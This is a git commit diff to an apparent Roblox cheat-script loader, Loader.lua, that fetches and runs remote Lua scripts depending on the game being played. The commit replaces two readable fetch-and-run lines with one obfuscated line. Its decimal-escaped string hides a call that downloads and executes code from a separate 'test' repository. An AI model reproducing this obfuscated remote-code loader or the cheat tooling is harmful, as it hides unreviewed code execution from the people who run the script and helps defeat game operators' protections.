306257ac5412c643ea562c4f9b0cfdeb209abfb2
Iratethisname10 <115908538+Iratethisname10@users.noreply.github.com>
2022-11-26 14:11:15 +0800

    Add files via upload

--- Loader.lua
+++ Loader.lua
@@ -26,5 +26,4 @@ if game.PlaceId == 9834528893 then  --1jumpsecond
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/Script/1jumpsecond.lua"))()
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/cuzyes.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/genDetect.lua"))()
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\114\97\116\101\116\104\105\115\110\97\109\101\49\48\47\116\101\115\116\47\109\97\105\110\47\52\51\116\103\102\100\47\51\119\101\100\46\108\117\97\34\41\41\40\41")();
